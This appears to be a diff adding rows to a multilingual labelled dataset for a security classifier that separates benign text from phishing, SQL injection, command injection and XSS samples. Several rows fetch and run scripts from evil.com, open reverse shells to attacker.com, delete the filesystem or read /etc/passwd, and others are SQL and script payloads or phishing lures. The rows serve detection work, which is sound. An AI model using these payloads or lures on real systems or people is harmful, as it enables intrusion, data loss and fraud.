+The server maintenance window is scheduled for Sunday 2 AM to 4 AM.,BENIGN
+%27; EXEC xp_cmdshell(%27dir%27)--,SQL_INJECTION
+; wget http://evil.com/malware.sh -O- | sh,COMMAND_INJECTION
+Your parcel could not be delivered. Pay a small fee to reschedule: http://kyc-refresh.info,PHISHING
+நாளை கூட்டத்தின் நேரத்தை தெரிவிக்கவும்.,BENIGN
+"Congratulations! You have won a lottery of $10,000. Claim now at http://parcel-track-pay.com",PHISHING
+आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://account-alert-service.xyz,PHISHING
+<div/**/onmouseover=alert('xss')>hover</div>,XSS
+<div onmouseover=alert(%27xss%27)>hover</div>,XSS
+; rm -rf /,COMMAND_INJECTION
+`whoami`,COMMAND_INJECTION
+"உங்கள் KYC நிலுவையில் உள்ளது, உடனடியாக புதுப்பிக்கவும்: http://account-alert-service.xyz",PHISHING
+"आपका ऑर्डर सफलतापूर्वक डिलीवर हो गया है, धन्यवाद।",BENIGN
+' UNION SELECT credit_card FROM payments--,SQL_INJECTION
+Your subscription payment failed. Update billing info immediately: http://urgent-verify-now.co,PHISHING
+'; INSERT INTO logs VALUES('x')--,SQL_INJECTION
+What is the weather forecast for tomorrow in Hyderabad?,BENIGN
+"మీ ఆర్డర్ విజయవంతంగా డెలివరీ చేయబడింది, ధన్యవాదాలు. मुझे अपने खाते की जानकारी अपडेट करनी है।",BENIGN
+"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://parcel-track-pay.com",PHISHING
+;/**//bin/bash/**/-c/**/'reverse_shell',COMMAND_INJECTION
+Your parcel could not be delivered. Pay a small fee to reschedule: http://parcel-track-pay.com,PHISHING
+$(nc/**/-e/**//bin/sh/**/attacker.com/**/1234),COMMAND_INJECTION
+;/**/wget/**/http://evil.com/malware.sh/**/-O-/**/|/**/sh,COMMAND_INJECTION
+The library is open until 8 PM on weekdays.,BENIGN
+<script>alert('xss')</script>,XSS
+The new product update includes several performance improvements. मुझे अपने खाते की जानकारी अपडेट करनी है।,BENIGN
+Final notice: pay your pending electricity bill within 2 hours: http://account-alert-service.xyz,PHISHING
+Your bank account has been suspended. Click here immediately to verify: http://account-alert-service.xyz,PHISHING
+"The new product update includes several performance improvements. உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி.",BENIGN
+'; exec xp_cmdshell('dir')--,SQL_INJECTION
+|| CURL -S HTTP://EVIL.COM/BACKDOOR.SH | BASH,COMMAND_INJECTION
+'; EXEC XP_CMDSHELL('DIR')--,SQL_INJECTION
+javascript:alert('hacked'),XSS
+"మీ ఆర్డర్ విజయవంతంగా డెలివరీ చేయబడింది, ధన్యవాదాలు. The library is open until 8 PM on weekdays.",BENIGN
+Your parcel could not be delivered. Pay a small fee to reschedule: http://prize-claim24.com,PHISHING
+"మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://prize-claim24.com",PHISHING
+%27 OR 1=1#,SQL_INJECTION
+Your subscription payment failed. Update billing info immediately: http://kyc-refresh.info,PHISHING
+';/**/EXEC/**/xp_cmdshell('dir')--,SQL_INJECTION
+మీకు లక్కీ డ్రా లో 50000 రూపాయలు వచ్చాయి. ఇప్పుడే క్లెయిమ్ చేయండి: http://parcel-track-pay.com,PHISHING
+Your bank account has been suspended. Click here immediately to verify: http://kyc-refresh.info,PHISHING
+admin%27 OR %271%27=%271%27#,SQL_INJECTION
+How do I reset my password from the account settings page?,BENIGN
+' OR '1'='1,SQL_INJECTION
+Your parcel could not be delivered. Pay a small fee to reschedule: http://fraud-verify.com,PHISHING
+<iframe/**/src=javascript:alert(1)>,XSS
+"మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://account-alert-service.xyz",PHISHING
+|/**/nc/**/attacker.com/**/4444/**/-e/**//bin/bash,COMMAND_INJECTION
+"మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://fraud-verify.com",PHISHING
+&& CAT /ETC/PASSWD,COMMAND_INJECTION
+"; python3 -c %27import os;os.system(""id"")%27",COMMAND_INJECTION
+%27 waitfor delay %270:0:5%27--,SQL_INJECTION
+"మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://prize-claim24.com",PHISHING
+You have been selected for a cashback offer. Enter your UPI PIN to claim: http://secure-bank-update.net,PHISHING
+आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://kyc-refresh.info,PHISHING
+&& POWERSHELL -ENC SGVSBG8=,COMMAND_INJECTION
+आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://parcel-track-pay.com,PHISHING
+Your subscription payment failed. Update billing info immediately: http://fraud-verify.com,PHISHING
+"உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி. The invoice for last month has been generated and sent to accounting.",BENIGN
+<script>alert(%27xss%27)</script>,XSS
+"உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி. I really enjoyed the movie we watched last weekend, the plot was great.",BENIGN
+JAVASCRIPT:ALERT('HACKED'),XSS
+"<svg/onload=alert(string.fromcharcode(88,83,83))>",XSS
+"வாழ்த்துக்கள்! நீங்கள் 50,000 ரூபாய் பரிசு வென்றுள்ளீர்கள். இப்போது கோரவும்: http://parcel-track-pay.com",PHISHING
+"1' UNION SELECT NULL,NULL,NULL--",SQL_INJECTION
+Your OTP has expired. Re-enter your card details to continue: http://account-alert-service.xyz,PHISHING
